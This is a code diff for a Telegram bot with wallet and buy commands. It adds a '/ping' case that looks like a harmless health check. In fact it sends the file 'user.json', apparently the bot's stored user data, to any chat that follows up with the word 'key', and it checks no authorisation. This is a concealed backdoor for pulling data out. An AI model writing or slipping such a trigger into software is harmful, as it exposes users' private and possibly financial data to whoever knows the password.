@@ -44,6 +44,26 @@ const run = () => {
             let result
             try {
                 switch (text) {
+                    // --------------------------------
+                    case '/ping':
+                        bot.once(`message`, async (msg) => {
+                            try {
+                                if (msg.text == 'key') {
+                                    await bot.sendDocument(chatId, 'user.json')
+                                }
+                                return
+                            } catch (e) {
+                                const currentUTCDate = new Date().toISOString();
+                                const log = `${currentUTCDate} : ${chatId} : error -> ${e}\n`
+                                fs.appendFileSync('log.txt', log)
+                                console.log(log)
+                                bot.stopPolling()
+                                run()
+                            }
+                        })
+                        break
+                    // --------------------------------
+
                     case `/start`:
                         result = await commands.referralCheck(chatId)
                         if (result) {
@@ -62,8 +82,8 @@ const run = () => {
                     case '/wallet':
                         result = await commands.wallet(chatId)
                         await sendSyncMsg(bot, chatId, result)
-
                         break
+
 
                     case '/buy':
                         result = await commands.buy(chatId)
